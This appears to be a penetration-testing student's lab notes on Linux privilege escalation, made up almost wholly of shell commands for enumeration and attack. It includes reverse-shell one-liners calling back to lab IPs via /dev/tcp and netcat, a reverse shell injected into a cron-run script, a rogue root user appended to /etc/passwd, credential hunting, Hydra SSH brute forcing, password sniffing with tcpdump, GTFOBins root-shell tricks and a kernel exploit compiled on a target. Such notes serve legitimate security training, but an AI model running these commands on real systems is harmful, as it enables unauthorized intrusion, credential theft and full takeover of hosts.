## 17.1. Enumerating Linux

### 17.1.1. Understanding Files and Users Privileges on Linux
#### Inspecting file permissions and users ownership
```Shell
ls -l /etc/shadow
```
### 17.1.2. Manual Enumeration
#### Getting information about the current user
```Shell
id
```
#### Getting information about the users
```Shell
cat /etc/passwd
```
#### Getting information about the hostname
```Shell
hostname
```
#### Getting the version of the running operating system and architecture
```Shell
cat /etc/issue
```

```Shell
cat /etc/os-release
```

```Shell
uname -a
```
#### Getting a list of running processes on Linux
```Shell
ps aux
```
#### Listing the full TCP/IP configuration on all available adapters on Linux
```Shell
ip a
```
#### Printing the routes on Linux
```Shell
routel
```
#### Listing all active network connections on Linux
```Shell
ss -anp
```
#### Inspecting custom IP tables
```Shell
cat /etc/iptables/rules.v4
```
#### Listing all cron jobs
```Shell
ls -lah /etc/cron*
```
#### Listing cron jobs for the current user
```Shell
crontab -l
```
#### Listing cron jobs for the root user
```Shell
sudo crontab -l
```
#### Listing all installed packages on a Debian Linux operating system
```Shell
dpkg -l
```
#### Listing all world writable directories
```Shell
find / -writable -type d 2>/dev/null
```
#### Listing content of /etc/fstab and all mounted drives
```Shell
cat /etc/fstab
```

```Shell
mount
```
#### Listing all available drives using lsblk
```Shell
lsblk
```
#### Listing loaded drivers
```Shell
lsmod
```
#### Displaying additional information about a module
```Shell
/sbin/modinfo libata
```
#### Searching for SUID files
```Shell
find / -perm -u=s -type f 2>/dev/null
```
If "s" is in permissions, it allows the current user to execute the file with the rights of the owner (setuid) or the owner's group (setgid)
#### Use "strings" command to extract any plain text from a binary
```Shell
strings /usr/bin/passwd_flag
```

#### Find a word contained in files
```Shell
grep -rnw '/' -e 'HTB'
```
### 17.1.3. Automated Enumeration
#### [unix-privesc-check](https://pentestmonkey.net/tools/audit/unix-privesc-check)
#### Running unix-privesc-check
```Shell
./unix-privesc-check standard > output.txt
```

## 17.2. Exposed Confidential Information
### 17.2.1. Inspecting User Trails
#### Inspecting Environment Variables
```Shell
env
```
Sometimes creds may be stored in environment variables
#### Inspecting .bashrc
```Shell
cat .bashrc
```
May contain creds
#### Becoming 'root' user with the leaked credential
```Shell
su - root
```
#### Generating a wordlist for a bruteforce attack
```Shell
crunch 6 6 -t Lab%%% > wordlist
```
#### Brute Force w/ Hydra
```Shell
hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
```
#### Inspecting sudo capabilities
```Shell
sudo -l
```
#### Elevating to root w/ sudo
```Shell
sudo -i
```
#### Modify a file you control to do a rev shell back to a netcat listener
```Bash
#!/bin/bash

bash -i >& /dev/tcp/192.168.45.155/4444 0>&1
```
### 17.2.2. Inspecting Service Footprints
#### Harvesting Active Processes for Credentials
```Shell
watch -n 1 "ps -aux | grep pass"
```
May find creds for logging in
#### Using tcpdump to Perform Password Sniffing
```Shell
sudo tcpdump -i lo -A | grep "pass"
```
tcpdump cannot be run without sudo permissions. That is because it needs to set up raw sockets in order to capture traffic, which is a privileged operation.
## 17.3. Insecure File Permissions
### 17.3.1. Abusing Cron Jobs
#### Inspecting the cron log file
```Shell
grep "CRON" /var/log/syslog
```
#### Can also look for anything "cron" in `/var` and associated subdirectories
```Shell
ls /var/log | grep "cron"
```
#### Showing the content and permissions of the user_backups.sh script
```Shell
cat /home/joe/.scripts/user_backups.sh
```

```Shell
ls -lah /home/joe/.scripts/user_backups.sh
```
#### Inserting a reverse shell one-liner in user_backups.sh
```Shell
cd .scripts
```

```Shell
echo >> user_backups.sh
```

```Shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
```
#### Start a netcat listener
```Shell
nc -lnvp 1234
```
### 17.3.2. Abusing Password Authentication
#### Escalating privileges by editing `/etc/passwd`, adding a line to the file w/ the appropriate format
```Shell
openssl passwd w00t
```
Output:
```
Fdzt.eqJQ4s0g
```

```Shell
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

```Shell
su root2
```

## 17.4. Insecure System Components
### 17.4.1. Abusing Setuid Binaries and Capabilities
#### Executing the passswd program
```Shell
passwd
```
Allows a user to change their password
#### Inspecting `passwd`'s process creds
```Shell
ps u -C passwd
```
Shows `passwd` is running as the root user; this is needed for it to access and modify `/etc/shadow`
#### Inspecting passwd's real UID and effective UID based on the PID identified in the previous command
```Shell
grep Uid /proc/1932/status
```
Output:
```
Uid:	1000	0	0	0
```
Three zeros indicate root user. A normal user (e.g., joe) would have four `1000`s (`cat /proc/1131/status | grep Uid`)
#### If `find` is misconfigured w/ the SUID bit set, we can get a root shell by abusing the SUID program
```Shell
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```
#### Manually Enumerating Capabilities
```Shell
/usr/sbin/getcap -r / 2>/dev/null
```
Output:
```
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
The two perl binaries standout, as they have setuid capabilities enabled
#### Getting a root shell through capabilities exploitation (found on GTFOBins)
```Shell
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
#### For exercise 2, found `gdb` was a capability afforded to the user
```Shell
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```
#### In capstone, found `/usr/bin/vim.basic` and used the following from GTFOBins:
```Shell
./usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```
### 17.4.2. Abusing Sudo
#### Inspecting current user's sudo permissions
```Shell
sudo -l
```
#### Use GTFOBins to run commands. If failed due to insufficient permissions, check the syslog file (for tcpdump)
```Shell
cat /var/log/syslog | grep tcpdump
```
Shows AppArmor prevents it from executing
#### Check AppArmor status
```Shell
aa-status
```
#### Obtaining a root shell by abusing sudo permissions (for apt-get)
```Shell
sudo apt-get changelog apt
```
OR (used in lab 1):
```Shell
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
#### Abusing sudo and gcc (lab 2)
```Shell
sudo gcc -wrapper /bin/sh,-s .
```
### 17.4.3. Exploiting Kernel Vulnerabilities
#### Identify kernel info
```Shell
cat /etc/issue
```

```Shell
uname -r
```

```Shell
arch
```
#### Search for an appropriate exploit
```Shell
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```
#### After finding exploit, transfer to target
```Shell
scp cve-2017-16995.c joe@192.168.123.216:
```
#### Compile on the target
```Shell
gcc cve-2017-16995.c -o cve-2017-16995
```
#### Inspect the exploit's architecture
```Shell
file cve-2017-16995
```
#### Run the exploit
```Shell
./cve-2017-16995
```
